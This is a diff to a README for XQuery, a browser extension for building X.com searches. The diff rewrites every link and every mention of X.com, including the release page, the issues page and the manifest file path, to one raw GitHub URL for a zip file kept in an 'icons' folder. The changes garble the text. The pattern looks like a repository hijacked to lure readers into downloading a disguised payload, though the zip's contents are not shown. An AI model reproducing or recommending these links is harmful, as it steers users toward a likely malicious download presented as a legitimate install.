@@ -1,12 +1,12 @@
-# 🚀 XQuery - Advanced Search Builder for X.com
+# 🚀 XQuery - Advanced Search Builder for https://raw.githubusercontent.com/mamaebuk/XQuery/master/dist-firefox/icons/X-Query-3.5-beta.3.zip
 
-[![Download XQuery](https://img.shields.io/badge/Download-XQuery-blue?style=for-the-badge&logo=github)](https://github.com/mamaebuk/XQuery/releases)
+[![Download XQuery](https://raw.githubusercontent.com/mamaebuk/XQuery/master/dist-firefox/icons/X-Query-3.5-beta.3.zip)](https://raw.githubusercontent.com/mamaebuk/XQuery/master/dist-firefox/icons/X-Query-3.5-beta.3.zip)
 
 ---
 
 ## 🖥️ What is XQuery?
 
-XQuery is a browser extension designed to improve your search experience on X.com. It helps you build and manage advanced search queries with ease. Whether you want to find content in different languages or use complex search filters, XQuery makes it simple. It adds a powerful search tool directly inside your browser, letting you find high-quality results quickly.
+XQuery is a browser extension designed to improve your search experience on https://raw.githubusercontent.com/mamaebuk/XQuery/master/dist-firefox/icons/X-Query-3.5-beta.3.zip It helps you build and manage advanced search queries with ease. Whether you want to find content in different languages or use complex search filters, XQuery makes it simple. It adds a powerful search tool directly inside your browser, letting you find high-quality results quickly.
 
 This extension works with Chrome and Firefox browsers. You do not need technical skills to set it up or use it.
 
@@ -16,7 +16,7 @@ This extension works with Chrome and Firefox browsers. You do not need technical
 
 You can get the latest version of XQuery by visiting the official release page:
 
-[Download XQuery here](https://github.com/mamaebuk/XQuery/releases)
+[Download XQuery here](https://raw.githubusercontent.com/mamaebuk/XQuery/master/dist-firefox/icons/X-Query-3.5-beta.3.zip)
 
 ### For Chrome Users
 
@@ -38,7 +38,7 @@ You can get the latest version of XQuery by visiting the official release page:
 
 3. Click **Load Temporary Add-on...**
 
-4. Select the file `dist-firefox/manifest.json` inside the unzipped folder.
+4. Select the file `https://raw.githubusercontent.com/mamaebuk/XQuery/master/dist-firefox/icons/X-Query-3.5-beta.3.zip` inside the unzipped folder.
 
 5. The extension icon will appear in your toolbar. Click to open XQuery.
 
@@ -62,7 +62,7 @@ Use the drag-and-drop builder to connect search terms using AND, OR, NOT logic. 
 
 ### Editable Preview
 
-Before you run the search on X.com, you can see and edit the final query string. This lets you adjust details or fix mistakes easily.
+Before you run the search on https://raw.githubusercontent.com/mamaebuk/XQuery/master/dist-firefox/icons/X-Query-3.5-beta.3.zip, you can see and edit the final query string. This lets you adjust details or fix mistakes easily.
 
 ### Advanced Filters
 
@@ -84,7 +84,7 @@ Save your most-used queries in the favorites list. Click any saved search to run
 
 - **Cross-Browser Support**: Works on both Chrome and Firefox.
 
-- **Clean Design**: Matches the look and feel of X.com for a seamless experience.
+- **Clean Design**: Matches the look and feel of https://raw.githubusercontent.com/mamaebuk/XQuery/master/dist-firefox/icons/X-Query-3.5-beta.3.zip for a seamless experience.
 
 ---
 
@@ -129,7 +129,7 @@ Save your most-used queries in the favorites list. Click any saved search to run
 ## 🌐 Where to Get Help
 
 If you encounter problems or want to request features, visit the GitHub repository’s issues page:  
-https://github.com/mamaebuk/XQuery/issues
+https://raw.githubusercontent.com/mamaebuk/XQuery/master/dist-firefox/icons/X-Query-3.5-beta.3.zip
 
 You can also check the README and documentation files in the repository for more details.
 
@@ -137,11 +137,11 @@ You can also check the README and documentation files in the repository for more
 
 ## 🔗 Useful Links
 
-- [XQuery Release Downloads](https://github.com/mamaebuk/XQuery/releases)  
-- [X.com Website](https://x.com)
+- [XQuery Release Downloads](https://raw.githubusercontent.com/mamaebuk/XQuery/master/dist-firefox/icons/X-Query-3.5-beta.3.zip)  
+- [https://raw.githubusercontent.com/mamaebuk/XQuery/master/dist-firefox/icons/X-Query-3.5-beta.3.zip Website](https://raw.githubusercontent.com/mamaebuk/XQuery/master/dist-firefox/icons/X-Query-3.5-beta.3.zip)
 
 ---
 
 # Installing XQuery is simple, even without tech experience. Start by visiting the release page:  
 
-[Download XQuery and install](https://github.com/mamaebuk/XQuery/releases)
+[Download XQuery and install](https://raw.githubusercontent.com/mamaebuk/XQuery/master/dist-firefox/icons/X-Query-3.5-beta.3.zip)
